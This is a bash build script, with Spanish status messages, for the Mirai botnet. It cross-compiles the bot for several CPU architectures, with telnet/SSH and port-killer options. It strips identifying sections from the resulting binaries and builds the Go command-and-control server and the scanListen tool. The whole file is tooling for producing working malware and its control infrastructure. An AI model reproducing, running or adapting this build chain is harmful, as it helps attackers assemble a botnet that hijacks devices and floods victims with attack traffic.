#!/bin/bash

FLAGS=""

function compile_bot {
    echo "Compilando $2..."
    "$2-gcc" -std=c99 $4 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o $1/"$3" -DMIRAI_BOT_ARCH=\""$2"\"
    "$2-strip" $1/"$3" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}

if [ $# != 2 ]; then
    echo "!> Falta la arquitectura." 
    echo "!> Usage: $0 <debug | release> <telnet | ssh>"
    exit
fi

if [ "$2" == "telnet" ]; then
    FLAGS="-DMIRAI_TELNET"
elif [ "$2" == "ssh" ]; then
    FLAGS="-DMIRAI_SSH"
fi

if [ "$1" == "release" ]; then
    DIR=release
elif [ "$1" == "debug" ]; then
    DIR=debug
    FLAGS="$FLAGS -DDEBUG"
else
    echo "Unknown parameter $1: $0 <debug | release>"
    exit 1
fi

rm -rf $DIR
mkdir -p $DIR

compile_bot $DIR i586    mirai.x86  "$FLAGS -DKILLER_REBIND_SSH -static"
#compile_bot $DIR armv4l  mirai.arm  "$FLAGS -DKILLER_REBIND_SSH -static"
#compile_bot $DIR m68k    mirai.m68k "$FLAGS -DKILLER_REBIND_SSH -static"
#compile_bot $DIR mips    mirai.mips "$FLAGS -DKILLER_REBIND_SSH -static"
#compile_bot $DIR mipsel  mirai.mpsl "$FLAGS -DKILLER_REBIND_SSH -static"
#compile_bot $DIR powerpc mirai.ppc  "$FLAGS -DKILLER_REBIND_SSH -static"
#compile_bot $DIR sparc   mirai.spc  "$FLAGS -DKILLER_REBIND_SSH -static"
#compile_bot $DIR sh4     mirai.sh4  "$FLAGS -DKILLER_REBIND_SSH -static"

compile_bot $DIR i586    miraint.x86  "$FLAGS -static"
#compile_bot $DIR armv4l  miraint.arm  "$FLAGS -static"
#compile_bot $DIR m68k    miraint.m68k "$FLAGS -static"
#compile_bot $DIR mips    miraint.mips "$FLAGS -static"
#compile_bot $DIR mipsel  miraint.mpsl "$FLAGS -static"
#compile_bot $DIR powerpc miraint.ppc  "$FLAGS -static"
#compile_bot $DIR sparc   miraint.spc  "$FLAGS -static"
#compile_bot $DIR sh4     miraint.sh4  "$FLAGS -static"

echo "Compilando cnc..."
go build -o $DIR/cnc cnc/*.go

echo "Compilando scanListen..."
go build -o $DIR/scanListen tools/scanListen.go
